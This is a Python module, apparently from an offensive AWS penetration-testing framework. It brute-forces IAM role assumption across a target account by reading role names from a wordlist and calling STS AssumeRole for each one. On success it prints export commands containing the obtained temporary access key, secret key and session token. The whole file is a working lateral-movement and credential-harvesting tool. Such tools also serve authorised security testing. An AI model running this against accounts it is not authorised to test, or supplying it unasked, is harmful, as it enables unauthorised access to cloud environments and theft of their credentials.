import boto3
import os
from colorama import Fore, Style
from functions import create_client

def help():
    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
    print("[+] Module Description:\n")
    print("\tThis module will attempt to move lateraly on the account by assuming roles.")
    print("\tYou will need to provide the account number that you want to move to, and a wordlist")
    print("\twith the role names that you want the module to try to impersonate.\n")

    print("[+] Module Functionality:\n")
    print("\tThe module will use the provided account number an role wordlist to create an arn")
    print("\tthat it will try to impersonate.")
    print("\tIf the impersonation is successfull, the module will print the 'export' command required")
    print("\tto use the new role identity and halt execution.")
    print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)

def assume_role(session, role_name, acc_number, session_name, botoconfig):
    client_config = create_client.Client(botoconfig, session, 'sts')
    client = client_config.create_aws_client()
    try:
        response = client.assume_role(
                RoleArn='arn:aws:iam::{}:role/{}'.format(acc_number, role_name),
                RoleSessionName=session_name,
                DurationSeconds=3600
                )
        return response
    except Exception as e:
        return(e.response["Error"]["Code"])

def brute_role(session, botoconfig):
    wordlist = input("Please specify the wordlist to be used: ")

    if not os.path.exists(wordlist):
        print(Fore.RED + "[-] Wordlist file not found..." + Style.RESET_ALL)

        return False
        
    acc_number = input("Please specify the account number to be used: ")
    session_name = input("Please specify the session name to be used: ")

    if not session_name:
        session_name = "AssumedRole"
        
    role_names_file = open(wordlist, 'r')
    role_names = role_names_file.readlines()

    for role_name in role_names:
        arn = "[+] Trying to impersonate role = arn:aws:iam::{}:role/{}".format(acc_number, role_name.strip())

        AssumeRole = assume_role(session, role_name.strip(), acc_number, session_name, botoconfig)
        
        if AssumeRole == "AccessDenied":
            pass

        elif AssumeRole["ResponseMetadata"]["HTTPStatusCode"] == 200:
            print(Fore.GREEN + "\n[+] Role Impersonation Successful [+]")
            print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
            print("export AWS_ACCESS_KEY_ID={}".format(AssumeRole["Credentials"]["AccessKeyId"]))
            print("export AWS_SECRET_ACCESS_KEY={}".format(AssumeRole["Credentials"]["SecretAccessKey"]))
            print("export AWS_SESSION_TOKEN={}".format(AssumeRole["Credentials"]["SessionToken"]))
            break

def main(botoconfig, session, selected_session):
    print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
    print("[+] Starting Bruteforce Roles Module...\n")

    brute_role(session, botoconfig)